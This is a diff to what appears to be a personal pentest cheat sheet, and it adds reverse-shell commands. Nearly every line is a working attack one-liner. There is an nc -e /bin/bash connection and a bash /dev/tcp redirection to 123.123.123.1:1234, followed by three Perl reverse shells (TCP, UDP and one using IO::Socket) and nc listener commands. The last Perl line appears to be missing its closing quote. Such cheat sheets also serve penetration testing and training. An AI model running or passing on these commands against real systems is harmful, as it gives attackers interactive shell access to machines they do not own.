@@ -3,6 +3,12 @@ python3 -m http.server 1234
 nc -lnvp 1234
 
 ##Reverse shell
-On target: nc 123.123.123.1 1234 -e /bin/bash
+On target: 
+nc 123.123.123.1 1234 -e /bin/bash
 bash -c "bash -i >& /dev/tcp/123.123.123.1/1234 0>&1"
-combined with listener: nc -lvnp 1234 on listening host
+#Thanks to O'Reilly for these: perl reverse shell depended on /bin/sh with tcp and udp and then one without /bin/sh
+perl -e 'use Socket;$i="123.123.123.1";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
+perl -e 'use Socket;$i="123.123.123.1";$p=1234;socket(S,PF_INET,SOCK_DGRAM,getprotobyname("udp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};' 
+perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"123.123.123.1:1234");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>; 
+
+On listening host: nc -lvnp 1234
